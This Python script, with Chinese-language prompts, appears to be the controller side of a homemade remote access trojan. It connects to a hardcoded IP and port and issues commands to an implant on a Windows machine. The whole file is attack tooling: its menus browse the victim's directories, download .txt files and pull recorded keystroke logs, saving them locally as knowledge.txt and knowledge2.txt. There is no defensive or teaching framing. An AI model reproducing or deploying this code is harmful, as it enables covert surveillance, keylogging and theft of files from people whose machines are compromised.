#! python3
# -*-coding:utf-8 -*-
#向所有虚假的和平与妥协挥下审判之镰！

from socket import *

address='10.209.0.172'
port=12345

lt=''
i=0
length=''
llen=''
wanttodo=''
pathnow=''
try2hack=''
filenum=''
filename=''
filelist=[]
folderlist=[]
hasfolder=0
txtlist=[]
tofolder=''
hastxt=0

def newrecc(csock,lt,n):
	while len(lt.encode())<n:				#这样才兼容中文字符！
		k=''
		k=csock.recv(n-len(lt)).decode('utf-8')
		print("k=%s"%k)
		lt+=k
	return lt

s=socket(AF_INET,SOCK_STREAM)
s.connect((address,port))

while wanttodo!='0':
	print("身份确认 已进入末日后幸存者共济系统 请铭记 我们应致力于搜寻每一个Windows系统机器记录到的幸存者踪迹")
	print("以下是你当前权限所能进行的操作")
	print("0.退出程序")
	print("1.访问目标机器文件")
	print("2.获取目标机器近期输入记录")
	print("--------------------------------------------------------------------------------------------------")
	wanttodo=input("请输入对应数字:")
	if wanttodo=='0':
		s.send('0'.encode())
	elif wanttodo=='1':
		s.send('1'.encode())
		llen=''
		length=''
		llen=newrecc(s,llen,1)
		length=newrecc(s,length,int(llen))
		pathnow=''
		pathnow=newrecc(s,pathnow,int(length))
		print("Now we're in %s"%pathnow)

		while try2hack!='exit':
			print("Now we're in %s"%pathnow)
			print("请选择要进行的操作")
			print("1.获取当前路径文件名列表")
			print("2.选择文件夹进入")
			print("3.选择文件下载（目前仅支持txt）")
			print("4.退出当前文件夹")
			print("5.获取近期键盘输入记录")
			print("exit.返回")
			print("-----------------------------------------------------------------------------------------------")
			try2hack=input("请输入对应数字或字母：")
			if try2hack=='1':
				s.send('1'.encode())
				length=''
				length=newrecc(s,length,1)
				print("BBBBBBBBBBBBBBBBBBBBBBBBB")
				print(length)
				filenum=''
				filenum=newrecc(s,filenum,int(length))
				filelist=[]
				for i in range(int(filenum)):
					llen=''
					length=''
					llen=newrecc(s,llen,1)
					length=newrecc(s,length,int(llen))
					filename=''
					print("llen=%s"%llen)
					print("length=%s"%length)
					filename=newrecc(s,filename,int(length))
					filelist.append(filename)
				print(filelist)
			elif try2hack=='2':
				s.send('2'.encode())
				folderlist=[]
				for i in range(int(filenum)):
					if filelist[i].find('.')!=-1:		#不包含"."
						continue
					elif filelist[i].find('.')==-1:
						folderlist.append(filelist[i])
						hasfolder=1
				if hasfolder==0:
					print("当前目录没有文件夹！")
				else:
					for i in range(len(folderlist)):
						print(str(i+1)+'.'+folderlist[i])
					tofolder=input("请输入要进入的文件夹的序号:")
					s.send('Y'.encode())
					foldername=folderlist[int(tofolder)-1]
					s.send(str(len(str(len(foldername.encode())))).encode())
					s.send(str(len(foldername.encode())).encode())
					s.send(foldername.encode())
					llen=''
					length=''
					llen=newrecc(s,llen,1)
					length=newrecc(s,length,int(llen))
					pathnow=''
					pathnow=newrecc(s,pathnow,int(length))
					print("Now we're in %s II"%pathnow)
			elif try2hack=='3':
				s.send('3'.encode())
				for i in range(int(filenum)):
					if filelist[i].find('.txt')==-1:
						continue
					elif filelist[i].find('.txt')!=-1:
						txtlist.append(filelist[i])
						hastxt=1
				if hastxt==0:
					print("当前目录没有txt文件")
				else:
					for i in range(len(txtlist)):
						print(str(i+1)+'.'+txtlist[i])
					todownload=''
					todownload=input("请选择要下载的文件")
					s.send('Y'.encode())
					txtname=txtlist[int(todownload)-1]
					s.send(str(len(str(len(txtname.encode())))).encode())
					s.send(str(len(txtname.encode())).encode())
					s.send(txtname.encode())
					llen=''
					length=''
					llen=newrecc(s,llen,1)
					length=newrecc(s,length,int(llen))
					lt=''
					lt=newrecc(s,lt,int(length))
					existornot=0
					try:
						fgot2=open(txtname,'r')
						existornot=1
						fgot2.close()
					except:
						fgot2=open(txtname,'w+')
						fgot2.close()
					finally:
						if existornot==1:
							fgot2=open(txtname[0:-4]+'(2).txt','w+')
						else:
							fgot2=open(txtname,'w+')
						fgot2.write(lt)
						fgot2.close()
			elif try2hack=='4':
				s.send('4'.encode())
				llen=''
				length=''
				llen=newrecc(s,llen,1)
				length=newrecc(s,length,int(llen))
				pathnow=''
				pathnow=newrecc(s,pathnow,int(length))
				print("Now we're in %s III"%pathnow)
			elif try2hack=='5':
				s.send('5'.encode())
				with open('knowledge2.txt','w+') as fgot:
					print("是的 我创建了这个东西")
					llen=newrecc(s,llen,1)
					length=newrecc(s,length,int(llen))
					lt=newrecc(s,lt,int(length))
					fgot.write(lt)
					fgot.close()
			elif try2hack=='exit':
				break
	elif wanttodo=='2':
		s.send('2'.encode())
		with open('knowledge.txt','w+') as fgot:
			print("是的 我创建了这个东西")
			llen=newrecc(s,llen,1)
			length=newrecc(s,length,int(llen))
			lt=newrecc(s,lt,int(length))
			fgot.write(lt)
			fgot.close()
	else:
		print("无权限操作！请升级权限或者直接想清楚了再输入！")
s.close()